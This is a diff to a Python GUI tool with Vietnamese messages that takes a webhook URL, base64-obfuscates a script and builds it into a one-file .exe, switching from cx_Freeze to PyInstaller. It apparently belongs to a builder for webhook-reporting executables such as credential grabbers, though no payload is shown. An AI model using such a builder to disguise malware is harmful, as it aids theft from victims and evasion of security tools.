@@ -53,8 +53,8 @@ def download_and_install_python():
         file.write(response.content)
     subprocess.run([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"], check=True)
 
-def install_cx_freeze():
-    subprocess.run(["python", "-m", "pip", "install", "cx_Freeze"], check=True)
+def install_pyinstaller():
+    subprocess.run(["python", "-m", "pip", "install", "pyinstaller"], check=True)
 
 def obfuscate_code(content):
     b64_content = base64.b64encode(content.encode()).decode()
@@ -84,15 +84,15 @@ def obfuscate_and_convert():
     if not is_python_installed():
         messagebox.showinfo("Cài đặt Python", "Đang tải và cài đặt Python...")
         download_and_install_python()
-        # Cài đặt cx_Freeze sau khi cài đặt Python
-        install_cx_freeze()
-        messagebox.showinfo("Cài đặt hoàn tất", "Cài đặt Python và cx_Freeze đã hoàn tất. Vui lòng khởi động lại ứng dụng.")
+        # Cài đặt pyinstaller sau khi cài đặt Python
+        install_pyinstaller()
+        messagebox.showinfo("Cài đặt hoàn tất", "Cài đặt Python và pyinstaller đã hoàn tất. Vui lòng khởi động lại ứng dụng.")
         return
 
     try:
-        install_cx_freeze()
+        install_pyinstaller()
     except subprocess.CalledProcessError:
-        messagebox.showerror("Lỗi", "Không thể cài đặt cx_Freeze.")
+        messagebox.showerror("Lỗi", "Không thể cài đặt pyinstaller.")
         return
 
     webhook = entry.get()
@@ -114,19 +114,18 @@ def obfuscate_and_convert():
         file.write(obfuscated_code)
 
     setup_script = f"""
-from cx_Freeze import setup, Executable
+from PyInstaller.__main__ import run
 
-setup(
-    name="ObfuscatedApp",
-    version="1.0",
-    description="App with obfuscated code",
-    executables=[Executable("{temp_script_path}")]
-)
+run([
+    '--name=ObfuscatedApp',
+    '--onefile',
+    '{temp_script_path}'
+])
     """
     with open("setup.py", "w") as file:
         file.write(setup_script)
 
-    subprocess.run(["python", "setup.py", "build"])
+    subprocess.run(["python", "setup.py"])
 
     messagebox.showinfo("Hoàn thành", "Quá trình tạo file .exe hoàn tất!")
 
